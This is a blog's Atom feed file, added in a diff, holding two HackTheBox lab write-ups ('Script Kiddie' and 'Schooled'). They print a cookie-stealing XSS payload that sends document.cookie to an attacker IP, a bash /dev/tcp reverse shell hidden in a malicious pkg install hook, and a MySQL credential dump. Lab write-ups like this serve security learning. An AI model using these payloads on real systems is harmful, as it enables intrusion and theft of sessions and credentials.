@@ -1,0 +1,213 @@
+<?xml version="1.0" encoding="utf-8"?>
+
+<feed xmlns="http://www.w3.org/2005/Atom" >
+  <generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator>
+  <link href="/author/r3Z3l/feed.xml" rel="self" type="application/atom+xml" />
+  <link href="/" rel="alternate" type="text/html" />
+  <updated>2021-08-03T18:07:16+05:30</updated>
+  <id>/author/r3Z3l/feed.xml</id>
+
+  
+  
+  
+
+  
+    <title type="html">Writeups | </title>
+  
+
+  
+    <subtitle>Writeups by r3Z3l</subtitle>
+  
+
+  
+
+  
+    
+      
+    
+  
+
+  
+  
+
+  
+    <entry>
+      <title type="html">Script Kiddie Writeup</title>
+      <link href="/Script-Kiddie" rel="alternate" type="text/html" title="Script Kiddie Writeup" />
+      <published>2021-07-02T01:30:00+05:30</published>
+      <updated>2021-07-02T01:30:00+05:30</updated>
+      <id>/Script-Kiddie</id>
+      <content type="html" xml:base="/Script-Kiddie">&lt;p&gt;Easy Linux box from HackTheBox.&lt;/p&gt;
+
+&lt;p&gt;Starting with port scanning.
+let’s use rustscan.
+&lt;img src=&quot;assets/images/Pasted image 20210603125017.png&quot; alt=&quot;Pasted image 20210603125017.png&quot; /&gt;
+It has 2 ports open 22 and 5000.&lt;/p&gt;
+
+&lt;p&gt;Let’s visit port 5000.
+Webpage give three functionality.&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;port scanning&lt;/li&gt;
+  &lt;li&gt;msf payload generator&lt;/li&gt;
+  &lt;li&gt;sploit search&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;On, searching of msfvenom exploit we found apk template injection.&lt;/p&gt;
+
+&lt;p&gt;Let’s generate reverse shell payload using msfconsole.
+open up msfconsole and search msfvenom.
+&lt;img src=&quot;assets/images/Pasted image 20210603125802.png&quot; alt=&quot;Pasted image 20210603125802.png&quot; /&gt;
+let’s use it.
+set your lhost and lport and then run.&lt;/p&gt;
+
+&lt;p&gt;We got exploit let’s try to upload it on payload page.
+&lt;img src=&quot;assets/images/Pasted image 20210603130240.png&quot; alt=&quot;Pasted image 20210603130240.png&quot; /&gt;
+It give us a reverse shell.
+and make it stable using python tty command.
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;We found the user.txt in kid’s directory.&lt;/p&gt;
+
+&lt;p&gt;On enumeration we found that there is a file scanlosers.sh that is running every time.
+let’s read scanlosers.sh
+&lt;img src=&quot;assets/images/Pasted image 20210603132011.png&quot; alt=&quot;Pasted image 20210603132011.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;It’s reading from a hackers file which is in kid’s logs directory and we have permission to write on this file.
+Let’s copy code on your machine to get exploit.&lt;/p&gt;
+
+&lt;p&gt;Let’s try to edit a file in such a way that we can get reverse shell.
+&lt;img src=&quot;assets/images/Pasted image 20210603132636.png&quot; alt=&quot;Pasted image 20210603132636.png&quot; /&gt;
+testing on my machine i found that it’s ignoring first two written words.
+so i tried to edit hackers file so i can get reverse shell using nc.&lt;/p&gt;
+
+&lt;p&gt;Edited hackers file with this :
+&lt;img src=&quot;assets/images/Pasted image 20210603145816.png&quot; alt=&quot;Pasted image 20210603145816.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;when i saved this file i got reverse shell as pwn user.&lt;/p&gt;
+
+&lt;p&gt;On, checking sudo -l , I found that metasploit can be run as root without password.
+&lt;img src=&quot;assets/images/Pasted image 20210603150149.png&quot; alt=&quot;Pasted image 20210603150149.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;run:
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo msfconsole&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;then run:
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bash&lt;/code&gt;
+and we got root shell.
+Now, we can cat /root/root.txt&lt;/p&gt;</content>
+
+      
+      
+      
+      
+      
+
+      <author>
+          <name>Himanshu Kumar</name>
+        
+        
+      </author>
+
+      
+
+      
+
+      
+        <summary type="html">Easy Linux box from HackTheBox.</summary>
+      
+
+      
+      
+    </entry>
+  
+    <entry>
+      <title type="html">Schooled Writeup</title>
+      <link href="/Schooled-writeup" rel="alternate" type="text/html" title="Schooled Writeup" />
+      <published>2021-07-02T01:30:00+05:30</published>
+      <updated>2021-07-02T01:30:00+05:30</updated>
+      <id>/Schooled-writeup</id>
+      <content type="html" xml:base="/Schooled-writeup">&lt;p&gt;Medium Linux box from HackTheBox.&lt;/p&gt;
+
+&lt;p&gt;On rustscan, There are 3 ports open 22,80,33060
+we find that it’s running as schooled.htb
+let’s do directory fuzzing and subdomain fuzzing.
+&lt;img src=&quot;assets/images/Pasted image 20210802221702.png&quot; alt=&quot;Pasted image 20210802221702.png&quot; /&gt;
+we found moodle.schooled.htb&lt;/p&gt;
+
+&lt;p&gt;we find that it maths professors verifying profile and we have XSS vulnerability in moodle profile.
+we can try for maths professors document cookie.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;script&amp;gt;var x = document.cookie; var y = 'http://10.10.16.26/'; fetch(y+x)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;and running python server.
+&lt;img src=&quot;assets/images/Pasted image 20210802195032.png&quot; alt=&quot;Pasted image 20210802195032.png&quot; /&gt;
+we get cookie of Manuel Philips (Professors).
+so let’s edit our cookie and we are a teacher.&lt;/p&gt;
+
+&lt;hr /&gt;
+&lt;p&gt;On googling we found that there is exploit to become manager from teacher.
+we got a &lt;a href=&quot;https://github.com/HoangKien1020/CVE-2020-14321&quot;&gt;script&lt;/a&gt;. but it’s not working there’s a manual process of becoming manager.
+Recording: &lt;a href=&quot;https://vimeo.com/441698193&quot;&gt;here&lt;/a&gt;
+Something that i changed:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;I use Lianne Carter profile for making him as manager.&lt;/li&gt;
+  &lt;li&gt;In block_rce i uploaded a php reverse shell&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;After Getting shell first i tried to stablize the shell using python but it couldn’t find.
+So, I thought less try to search python in system and i found it /usr/local/bin/python3.7&lt;/p&gt;
+
+&lt;p&gt;for finding database:&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;find / -name &quot;config.php&quot; 2&amp;gt;/dev/null | grep &quot;moodle/config.php&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;in file we found credentials of mysql.&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/usr/local/bin/mysql -u moodle --password=PlaybookMaster2020 -e &quot;use moodle; select email,username,password from mdl_user; exit&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;and we got hashes.
+&lt;img src=&quot;assets/images/Pasted image 20210802235058.png&quot; alt=&quot;Pasted image 20210802235058.png&quot; /&gt;
+after using john we got password for admin and jamie.&lt;/p&gt;
+
+&lt;p&gt;We can ssh as jamie and got #user-txt .&lt;/p&gt;
+
+&lt;p&gt;On running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt;
+&lt;img src=&quot;assets/images/Pasted image 20210802235342.png&quot; alt=&quot;Pasted image 20210802235342.png&quot; /&gt;
+we can run pkg without password as root.
+on &lt;a href=&quot;https://gtfobins.github.io/gtfobins/pkg/&quot;&gt;Gftobin for pkg&lt;/a&gt; we found exploit.
+let’s create that pkg in our system&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;TF=$(mktemp -d)
+echo 'bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.16.24/4242 0&amp;gt;&amp;amp;1' &amp;gt; $TF/x.sh
+fpm -n x -s dir -t freebsd -a all --before-install $TF/x.sh $TF
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;note: &lt;a href=&quot;https://fpm.readthedocs.io/en/latest/installing.html&quot;&gt;fpm&lt;/a&gt; should be installed in your system.
+let’s send to box.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo pkg install -y --no-repo-update ./x-1.0.txz
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;gives us reverse shell.
+and we got #root-txt&lt;/p&gt;</content>
+
+      
+      
+      
+      
+      
+
+      <author>
+          <name>Himanshu Kumar</name>
+        
+        
+      </author>
+
+      
+
+      
+
+      
+        <summary type="html">Medium Linux box from HackTheBox.</summary>
+      
+
+      
+      
+    </entry>
+  
+</feed>
